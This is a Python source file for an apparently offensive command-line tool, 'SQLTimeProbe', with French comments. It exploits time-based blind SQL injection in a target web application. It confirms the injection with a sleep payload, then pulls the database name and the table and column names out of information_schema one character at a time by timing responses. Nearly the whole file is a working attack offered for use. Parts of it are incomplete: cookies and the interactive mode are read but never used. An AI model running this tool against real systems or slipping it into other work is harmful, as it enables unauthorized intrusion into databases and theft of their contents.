import requests
import time
import argparse
import urllib.parse
import re
import string

# ASCII art
ascii_art = """\033[91m
███████╗ ██████╗ ██╗  ████████╗██╗███╗   ███╗███████╗██████╗ ██████╗  ██████╗ ██████╗ ███████╗
██╔════╝██╔═══██╗██║  ╚══██╔══╝██║████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
███████╗██║   ██║██║     ██║   ██║██╔████╔██║█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝█████╗  
╚════██║██║▄▄ ██║██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║███████╗██║     ██║  ██║╚██████╔╝██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
-----------------------------------------------------------------------------------------------
|           ____           ____                         _                                     |
|          / __ )__  __   / __ \_________ _____  ____ _(_)_  ____________                     |
|         / __  / / / /  / / / / ___/ __ `/ __ \/ __ `/ / / / / ___/ ___/                     |
|        / /_/ / /_/ /  / /_/ / /  / /_/ / / / / /_/ / / /_/ (__  |__  )                      |
|       /_____/\__, /   \____/_/   \__,_/_/ /_/\__, /_/\__,_/____/____/                       |
|             /____/                          /____/                                          |
-----------------------------------------------------------------------------------------------
    \033[0m                                                                                          
"""

SLEEP_TIME = 2

ALPHABET = string.ascii_letters + string.digits + " !\"#$&'()*+,-./:;<=>?@[\\]^_`{|}~%"

TABLES_FUZZING = ['password','user','test','a','b','c']

verif_payload = "select sleep(2)"
verif_payload_urlencode ="select%20sleep%282%29"

############## FONCTIONS ##############

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RED_BOLD = '\033[91m\033[1m'
    GREEN_BOLD = '\033[92m\033[1m'
    BLUE_BOLD = '\033[94m\033[1m'
    END = '\033[0m'

def print_redb(text):
    print(f"{colors.RED_BOLD}{text}{colors.END}")

def print_greenb(text):
    print(f"{colors.GREEN_BOLD}{text}{colors.END}")

def print_red(text):
    print(f"{colors.RED}{text}{colors.END}")

def print_green(text):
    print(f"{colors.GREEN}{text}{colors.END}")

def print_blue(text):
    print(f"{colors.BLUE}{text}{colors.END}")

def print_blueb(text):
    print(f"{colors.BLUE_BOLD}{text}{colors.END}")

# Découpe une chaîne de caractères en deux parties lorsqu'il y a FUZZ.
def split_at_fuzz(input_string):
    parts = input_string.split("FUZZ")
    if len(parts) == 1:
        return parts[0], ""
    else:
        return parts[0], parts[1]

# Ajoute une payload, soit pour l'attaque, soit pour la vérification
def add_payload(input_string, payload):
    before_fuzz, after_fuzz = split_at_fuzz(input_string)
    return before_fuzz + payload + after_fuzz

# Encode une chaîne de caractères conformément aux spécifications URL.
def urlencode(string_to_encode):
    return urllib.parse.quote(string_to_encode)

def urlencode_in_tags(input_string):
    return re.sub(r'<@urlencode>(.*?)<@/urlencode>', lambda x: f"{urllib.parse.quote(x.group(1))}", input_string)

# Fonction pour exécuter la requête SQL et mesurer le temps de réponse
def get_request(url, params, cookies=None, verbose=0):
    start_time = time.time()
    response = requests.get(url, params=params, cookies=cookies)
    if response.status_code!=200:
        print_red("[-] Error with request (Error " + str(response.status_code) + ")")
    elif verbose > 0:
        print_green("[+] Request ok, status " + str(response.status_code) + "")
    end_time = time.time()
    return end_time - start_time

# Fonction pour vérifier si une requête prend plus de 5 secondes
def check_response_time(response_time):
    if response_time > SLEEP_TIME:
        return True
    else:
        return False

def verify(url, params, verbose=0):
    print_blue('[X] Verification of SQL Time-Based injection for ' + url)
    params=add_payload(params, verif_payload)
    params=urlencode_in_tags(params)
    response_time=get_request(url, params)
    if check_response_time(response_time):
        print_greenb('[+] Injection SQL Time-Based verificated')
    else:
        print_redb('[-] Injection not exploitable/unverified')
    return check_response_time(response_time)

def attack_one_payload(url, params, payload, verbose=0):
    params=add_payload(params, payload)
    params=urlencode_in_tags(params)
    response_time=get_request(url, params)
    if check_response_time(response_time):
        if verbose > 1:
            print_greenb('[+] Effective payload')
        return True
    else:
        if verbose > 1:
            print_redb('[-] Non effective payload')
        return False

def attack_get_nb(url, params, fuzz="pass"):
    for i in range(1, 40):
        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit "+str(i)+",1) like '%'"
        query = query_template.format(fuzz=fuzz)
        if not attack_one_payload(url,params, query):
            return i-1
    print_redb('[-] Error: Length >20 caracters')
    return -1

def attack_get_length(url, params, database=True, fuzz="pass", limit=0):
    if database:
        query_template = "select sleep(2) from dual where database() like '{mask}'"
    else:
        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit "+str(limit)+",1) like '{mask}'"
    for i in range(1, 40):
        mask = '_' * i
        query = query_template.format(fuzz=fuzz,mask=mask)
        if attack_one_payload(url,params, query):
            return i
    print_redb('[-] Error: Length >20 caracters')
    return -1

def attack_get_column_length(url, params, table, fuzz="pass", limit=0):
    query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '{mask}' limit "+str(limit)+",1) like '" + table + "'"
    for i in range(1, 51):
        for j in range(1, 50):
            mask = '_' * i + fuzz + '_' * j
            query = query_template.format(mask=mask)
            if attack_one_payload(url,params, query):
                return mask, len(mask)
    print_redb('[-] Error: Length >40 caracters')
    return -1

def attack_get_column(url, params, length, table, mask_with_fuzz, column_name="", i=1, verbose=0, limit=0):
    query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '{mask}' limit "+str(limit)+",1) like '" + table + "'"
    d = "column"
    for char in ALPHABET:
        mask = column_name + char + mask_with_fuzz[i:]
        query = query_template.format(mask=mask)
        if verbose > 2:
            print(query)
        if attack_one_payload(url, params, query):
            if length == 1:
                return char
            else:
                if verbose>=1:
                    print_greenb("[+] Retrieve "+ d + " name for table "+table+" : Length " + str(length) + ", Step retrieve :" + mask)
                i=i+1
                return char + attack_get_column(url, params, length - 1, table, mask_with_fuzz, column_name+char, i=i)
    print_redb('[-] Erreur: Caracter not in alphabet')
    return " "

def attack_get_information(url, params, length, database_name="", database=True, fuzz="pass", verbose=0, limit=0):
    if database:
        query_template = "select sleep(2) from dual where database() like '{mask}'"
        d="database"
    else:
        query_template = "select sleep(2) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%{fuzz}%' limit "+str(limit)+",1) like '{mask}'"
        d="table"
    for char in ALPHABET:
        mask = database_name + char + '_' * (length - 1)
        query = query_template.format(fuzz=fuzz,mask=mask)
        if verbose > 2:
            print(query)
        if attack_one_payload(url, params, query):
            if length == 1:
                return char
            else:
                if verbose>=1:
                    print_greenb("[+] Retrieve "+ d + " name : Length " + str(length) + ", Step retrieve :" + mask)
                return char + attack_get_information(url, params, length - 1, database_name+char, database, fuzz=fuzz)
    print_redb('[-] Erreur: Caracter not in alphabet')
    return " "

def attack_main(url, params, verbose=0):
    print_blue('[X] Retrieving the database name via SQL Time-Based injection via ' + url)
    print_blue("[X] Retrieve database name length")
    database_length = attack_get_length(url, params)
    if database_length != -1:
        print_greenb("[+] Database name length : " + str(database_length))
    else:
        return -1
    print_blue("[X] Retrieve database name")
    database_name = attack_get_information(url, params, database_length)
    print_greenb("[+] Database name : " + database_name)
    for fuzz in TABLES_FUZZING:
        print_blue("[X] Retrieve number of tables with column fuzzing:" + fuzz)
        nb_tables = attack_get_nb(url,params,fuzz)
        if database_length != -1:
            print_greenb("[+] We got " + str(nb_tables) +" number of tables with column fuzzing:" + fuzz)
        else:
            return -1
        print_blue("[X] Retrieve tables names")
        for i in range(nb_tables):
            print_blue("[X] Retrieve table number ["+str(i)+"] name length")
            table_length = attack_get_length(url, params, False, fuzz, i)
            if table_length != -1:
                print_greenb("[+] Table name length : " + str(table_length))
            else:
                return -1
            print_blue("[X] Retrieve table name")
            table = attack_get_information(url, params, table_length, "",False, fuzz, verbose, i)
            print_greenb("[+] Table : " + table)
            print_blue("[X] Retrieve table column for table " + table)
            print_blue("[X] Retrieve table column length for table " + table)
            mask, column_length = attack_get_column_length(url, params, table, fuzz, i)
            if column_length != -1:
                print_greenb("[+] Column name length : " + str(column_length))
                if verbose > 0:
                    print_greenb("[+] Retrieve column name for table "+table+" : Length " + str(column_length) + ", Step retrieve :" + mask)
            else:
                return -1
            column=attack_get_column(url, params, column_length, table, mask, limit=i)
            print_greenb("[+] Column in table " + table + " : " + column)
        

print(ascii_art)

# Command-line arguments parsing
parser = argparse.ArgumentParser(description="SQLTimeProbe: script to exploit Time-Based SQL Injection")
parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
parser.add_argument("-u", "--url", help="Target URL")
parser.add_argument("-p", "--params", help="Request parameters (format 'test=1&test=2&test=3') (with FUZZ for fuzzing)")
parser.add_argument("-a", "--attack", action="store_true", help="Retrieve information in the database")
parser.add_argument("-V", "--verify", action="store_true", help="Verify Time-Based SQL Injection")
parser.add_argument("-c", "--cookies", help="Cookies to include in the request (format 'cookie1=value1;cookie2=value2')")
parser.add_argument("-v", "--verbose", action="count", default=0, help="Increase output verbosity")
args = parser.parse_args()

# Verbose levels
if args.verbose == 1:
    print_blueb("[+] Verbose mode enabled.")
elif args.verbose > 1:
    print_blueb("[+] Debug mode enabled.")
elif args.verbose > 2:
    print_blueb("[+] Extreme debug mode enabled.")
elif args.verbose > 3:
    print_blueb("[+] WTF Are u serious ? debug mode enabled.")

# Si mode interactif est activé
if args.interactive:
    url = input("Entrez l'URL de la cible : ")
    params = input("Entrez vos paramètres de la rêquete (au format 'test=1&test=2&test=3') (avec FUZZ pour le fuzzing) :")
# Si l'utilisateur fournit l'URL et la requête en ligne de commande
elif args.url and args.params:
    url = args.url
    params = args.params
    attack = args.attack
    cookies = args.cookies
    if args.verify:
        verify(url, params,args.verbose)
    if args.attack:
        verify(url, params,args.verbose)
        attack_main(url, params, args.verbose)
else:
    print("Veuillez utiliser -i pour le mode interactif ou -u pour l'URL et -p pour les paramètres.")
    exit()
